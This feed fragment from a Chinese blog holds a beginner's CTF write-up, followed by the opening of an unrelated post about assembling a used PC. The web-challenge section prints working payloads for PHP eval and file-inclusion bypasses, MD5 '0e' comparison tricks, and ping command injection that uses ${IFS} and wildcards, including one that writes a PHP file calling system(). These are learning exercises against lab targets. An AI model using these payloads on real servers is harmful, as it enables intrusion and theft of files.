+&lt;/div>&lt;p>将第一个用base64解码得到geek{huan，第二个用base32解码得yingni}拼接后得到flag是&lt;code>geek{huanyingni}&lt;/code>&lt;/p>
+&lt;blockquote>
+&lt;p>只有大写字母和数字，像base32加密&lt;/p>
+&lt;/blockquote>
+&lt;p>学到了。。。&lt;/p>
+&lt;h2 id="web">web
+&lt;/h2>&lt;h3 id="web1">web1
+&lt;/h3>&lt;p>注释找到&lt;code>ZmxhZ+WcqC93ZWIvd2ViM59mbGFnL2ZsYWcudHh0&lt;/code>&lt;/p>
+&lt;p>base64解码得到&lt;/p>
+&lt;p>&lt;code>flag在http://ip/web/web1/flag/flag.txt&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://blog.wuko.top/posts/2024/10/30/newbiectf.html/web1.png"
+width="803"
+height="358"
+srcset="https://blog.wuko.top/posts/2024/10/30/newbiectf.html/web1_hu11932581412840536766.png 480w, https://blog.wuko.top/posts/2024/10/30/newbiectf.html/web1_hu10076901585374546124.png 1024w"
+loading="lazy"
+alt="web1"
+class="gallery-image"
+data-flex-grow="224"
+data-flex-basis="538px"
+>&lt;/p>
+&lt;p>访问得到&lt;code>geek{crazy}&lt;/code>&lt;/p>
+&lt;h3 id="web2">web2
+&lt;/h3>&lt;p>注释base64解码得到&lt;code>你会用dirsearch吗？&lt;/code>&lt;/p>
+&lt;p>&lt;code>dirsearch&lt;/code>扫描网站目录&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-cmd" data-lang="cmd">&lt;span class="line">&lt;span class="cl">python.exe ./dirsearch.py -u http://ip/web/web2/
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>得到http://ip/web/web2/flag.php，访问得到flag:&lt;code>geek{Excellent}&lt;/code>&lt;/p>
+&lt;h3 id="web3">web3
+&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl"> &lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">error_reporting&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;c&amp;#39;&lt;/span>&lt;span class="p">])){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$c&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;c&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="nx">preg_match&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;/flag|system|php|cat|sort|shell|\.| |\&amp;#39;|\`|echo|\;|\(|\:|&lt;/span>&lt;span class="se">\&amp;#34;&lt;/span>&lt;span class="s2">/i&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$c&lt;/span>&lt;span class="p">)){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">eval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$c&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>&lt;span class="k">else&lt;/span>&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">highlight_file&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="no">__FILE__&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>利用PHP命令&lt;code>eval()&lt;/code>可以执行系统命令：&lt;/p>
+&lt;p>&lt;code>http://ip/web/web3/index.php?c=include$_GET[&amp;quot;a&amp;quot;]?&amp;gt;&amp;amp;a=php://filter/read=convert.base64-encode/resource=flag.php&lt;/code>&lt;/p>
+&lt;p>得到&lt;code>PD9waHANCiRmbGFnPsInZWVre3ByZXR0eWdvb2R9ljsNCj8+&lt;/code>&lt;/p>
+&lt;p>base64解码得到&amp;lt;?php$flag=&amp;quot;&lt;code>geek{prettygood}&lt;/code>&amp;quot;;?&lt;/p>
+&lt;p>原理：&lt;/p>
+&lt;blockquote>
+&lt;p>preg_match()：执行一个正则表达式匹配,过滤掉&lt;code>/flag|system|php|cat|sort|shell|\.| |\'|\|echo|\;|\(/&lt;/code>，为了使正则失效，在输入c后加上&lt;code>&amp;gt;&lt;/code>来闭合PHP代码，再通过PHP伪协议获取flag的base64。&lt;/p>
+&lt;/blockquote>
+&lt;h3 id="web4">web4
+&lt;/h3>&lt;p>&lt;img src="https://blog.wuko.top/posts/2024/10/30/newbiectf.html/web4.jpg"
+width="789"
+height="404"
+srcset="https://blog.wuko.top/posts/2024/10/30/newbiectf.html/web4_hu2330833800200589664.jpg 480w, https://blog.wuko.top/posts/2024/10/30/newbiectf.html/web4_hu17856289135897834123.jpg 1024w"
+loading="lazy"
+alt="web4"
+class="gallery-image"
+data-flex-grow="195"
+data-flex-basis="468px"
+>&lt;/p>
+&lt;p>分析可得，需要传入一个值，该值的MD5的MD5还等于该值的MD5。。。&lt;/p>
+&lt;p>谷歌一下，找到相关知识点&lt;code>0e漏洞&lt;/code>：&lt;/p>
+&lt;blockquote>
+&lt;p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。from: &lt;a class="link" href="https://www.cnblogs.com/m-r-lee/p/13664402.html" target="_blank" rel="noopener"
+>[md5 collision碰撞]即PHP对0e的缺陷漏洞&lt;/a>&lt;/p>
+&lt;/blockquote>
+&lt;p>没找到。。。看官方WP找到值：&lt;code>0e215962017&lt;/code>&lt;/p>
+&lt;p>传入&lt;code>server.php?md5=0e215962017&lt;/code>&lt;/p>
+&lt;p>得到flag:&lt;code>geek{wonderful}&lt;/code>&lt;/p>
+&lt;h3 id="web5">web5
+&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// flag in flag.php
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nx">highlight_file&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="no">__FILE__&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;a&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;b&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;c&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_COOKIE&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span>&lt;span class="p">]))&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$a&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;a&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$b&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;b&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$c&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;c&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_COOKIE&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$a&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="nv">$b&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nx">md5&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$a&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nx">md5&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$b&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="nx">is_numeric&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$c&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nv">$c&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">1024&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nx">intval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$c&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">1024&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">include&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$name&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="s1">&amp;#39;.php&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>需要a不为b且他俩md5值一样，c是不为1024但取整后是1024，并且要通过cookie传入一个名字：&lt;/p>
+&lt;p>payload:&lt;code>/?a=240610708&amp;amp;b=314826850 POST：c=1024.1a COOKIE=name=php://filter/read=convert.base64-encode/resource=flag.php&lt;/code>&lt;/p>
+&lt;p>&lt;code>hackbar&lt;/code>拓展传入，得到base64密文&lt;code>PD9waHAgIA0KJGZsYWcgPSAnZ2Vla3tZb3UgYXJlIGdyZWF0fSc7IA0KPz4=&lt;/code>&lt;/p>
+&lt;p>base64解码得到flag：&lt;code>geek{You are great}&lt;/code>&lt;/p>
+&lt;h3 id="web6">web6
+&lt;/h3>&lt;p>查看源码找到&lt;code>&amp;lt;!-- visit '/api.php?source' for hint --&amp;gt;&lt;/code>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">function&lt;/span> &lt;span class="nf">sanitize&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$s&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$s&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">str_replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$s&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$s&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">str_replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39; &amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$s&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$s&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">str_replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$s&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$s&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">str_replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;flag&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$s&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nv">$s&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;source&amp;#39;&lt;/span>&lt;span class="p">]))&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">highlight_file&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="no">__FILE__&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">die&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;ip&amp;#39;&lt;/span>&lt;span class="p">]))&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">die&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;No IP Address&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$ip&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;ip&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$ip&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">sanitize&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$ip&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="nx">preg_match&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/((\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.){3}(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])/&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$ip&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">die&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Invalid IP Address&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">system&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;ping -c 4 &amp;#39;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nv">$ip&lt;/span>&lt;span class="o">.&lt;/span> &lt;span class="s1">&amp;#39; 2&amp;gt;&amp;amp;1&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>参考&lt;a class="link" href="https://blog.csdn.net/m0_74317362/article/details/133947590" target="_blank" rel="noopener"
+>0xGame 2023 - CSDN&lt;/a>&lt;/p>
+&lt;p>&lt;code>; &lt;/code>⽤ &lt;code>%0a&lt;/code> 绕过, 空格⽤ &lt;code>${IFS}&lt;/code> 绕过, &lt;code>/&lt;/code> 以及 &lt;code>flag&lt;/code> ⽤ base64 编码绕过:&lt;/p>
+&lt;p>post&lt;code>ip=127.0.0.1|ls%09..&lt;/code>发现&lt;code>geek&lt;/code>目录;&lt;/p>
+&lt;p>post&lt;code>ip=127.0.0.1|echo%09&amp;quot;PD9waHAgc3lzdGVtKCdscyAuLi9nZWVrJyk7&amp;quot;|base64%09-d%09&amp;gt;2.php&lt;/code>，执行无响应。。。&lt;/p>
+&lt;p>然后就解不出来了。。。查看WP:&lt;/p>
+&lt;p>&lt;code>输入127.0.0.1&amp;amp;&amp;amp;cd${IFS}..&amp;amp;&amp;amp;cd${IFS}geek&amp;amp;&amp;amp;ls切换到geek目录中，发现flag.php&lt;/code>&lt;/p>
+&lt;blockquote>
+&lt;p>因为过滤了flag，所以可以用&lt;code>cat${IFS}fla*&lt;/code>来查看其中内容&lt;/p>
+&lt;/blockquote>
+&lt;p>通配符绕过过滤！学到了！&lt;/p>
+&lt;p>得到flag:&lt;code>geek{hello geeker}&lt;/code>&lt;/p>
+&lt;h2 id="reverse">reverse
+&lt;/h2>&lt;h3 id="reverse1">reverse1
+&lt;/h3>&lt;p>&lt;code>IDA Pro&lt;/code>反编译在main函数中找到了flag{ajsju19hLDUkdrs8KB6Sl}&lt;/p>
+&lt;p>&lt;img src="https://blog.wuko.top/posts/2024/10/30/newbiectf.html/reverse1.png"
+width="2558"
+height="1527"
+srcset="https://blog.wuko.top/posts/2024/10/30/newbiectf.html/reverse1_hu9463629634252685365.png 480w, https://blog.wuko.top/posts/2024/10/30/newbiectf.html/reverse1_hu16725100383396805891.png 1024w"
+loading="lazy"
+alt="reverse1"
+class="gallery-image"
+data-flex-grow="167"
+data-flex-basis="402px"
+>&lt;/p>
+&lt;h3 id="reverse2">reverse2
+&lt;/h3>&lt;p>反编译查找胜利字符，找到 &lt;code>KSLSHDDOWskldrfsKSJ&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://blog.wuko.top/posts/2024/10/30/newbiectf.html/reverse2.png"
+width="2558"
+height="1527"
+srcset="https://blog.wuko.top/posts/2024/10/30/newbiectf.html/reverse2_hu6948432431722471271.png 480w, https://blog.wuko.top/posts/2024/10/30/newbiectf.html/reverse2_hu6939039416294071925.png 1024w"
+loading="lazy"
+alt="reverse2"
+class="gallery-image"
+data-flex-grow="167"
+data-flex-basis="402px"
+>&lt;/p>
+&lt;p>&lt;code>geek{KSLSHDDOWskldrfsKSJ}&lt;/code>&lt;/p>
+&lt;h2 id="结尾">结尾
+&lt;/h2>&lt;p>初知CTF，刚看到题就沉迷进去了，除了吃饭和睡觉满脑子都是题XDDD，有几道题还是上课摸鱼解出来的。最快乐的时候莫过于解出一道题，最痛苦的时候莫过于写WP（（（。&lt;/p></description></item><item><title>第一次捡垃圾装PC&amp;我的电脑历程</title><link>https://blog.wuko.top/posts/2024/06/09/pczhuangji.html/</link><pubDate>Sun, 09 Jun 2024 00:00:00 +0000</pubDate><guid>https://blog.wuko.top/posts/2024/06/09/pczhuangji.html/</guid><description>&lt;img src="https://blog.wuko.top/posts/2024/06/09/pczhuangji.html/004.jpg" alt="Featured image of post 第一次捡垃圾装PC&amp;我的电脑历程" />&lt;h2 id="前言">前言
+&lt;/h2>&lt;p>自打我记事以来，家里就已经有了一台电脑，这让我很早就接触到了互联网以及了解了很多这方面的知识。时与变迁，这台电脑的配置已经远远落后于时代（鲁大师击败全国百分之一），在经历了加内存（1+2换2+2）、升系统（xp-7-10）、加固态、加显卡（HD6450）后，终于得出结论：平台没救了。于是便有了本次装机。&lt;/p>
+&lt;h2 id="关于旧电脑">关于旧电脑
+&lt;/h2>&lt;p>先看配置：&lt;/p>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>配件&lt;/th>
+&lt;th>23333&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>CPU&lt;/td>
+&lt;td>AMD 速龙II X2 240 2.8GHz 2C2G&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>主板&lt;/td>
+&lt;td>映泰MCP6P M2&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>显卡&lt;/td>
+&lt;td>主板集成&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>内存&lt;/td>
+&lt;td>ddr2 800MHz 2g *2&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>其他&lt;/td>
+&lt;td>IDE光驱、250g希捷机械&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;p>2009，我家花费两千元左右买了电脑。&lt;/p>
+&lt;p>2011，注册了我的第一个QQ与微博（腾讯）。&lt;/p>
+&lt;p>2018，学习C4D，并用这台电脑渲染了累计十多个小时。。&lt;/p>
+&lt;p>2019，学习了Python，使用这台电脑开发了众多项目（虽然基本都弃坑了）。&lt;/p>
+&lt;p>2020，承担了网课重任，为了视频升级成了Win7，并且开始接触网站建设。&lt;/p>
+&lt;p>2021，电脑正式归我，开始接触Linux。&lt;/p>
+&lt;p>&amp;hellip;&lt;/p>
